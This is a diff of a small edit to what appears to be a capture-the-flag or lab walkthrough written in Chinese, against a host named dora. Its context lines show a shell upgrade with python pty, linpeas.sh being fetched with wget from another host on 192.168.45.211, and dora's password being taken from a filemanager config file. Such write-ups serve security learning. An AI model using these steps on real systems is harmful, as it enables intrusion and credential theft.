@@ -46,7 +46,7 @@ $ python3 -c 'import pty; pty.spawn("/bin/bash")'
 www-data@dora:/$
 ```
 
-linpeas，查看`/var/www/html/filemanager/config/.htusers.php`裡面有dora的密碼
+`linpeas.sh`，查看`/var/www/html/filemanager/config/.htusers.php`裡面有dora的密碼
 ```
 www-data@dora:/tmp$ wget 192.168.45.211:8000/linpeas.sh
 www-data@dora:/tmp$ chmod +x linpeas.sh
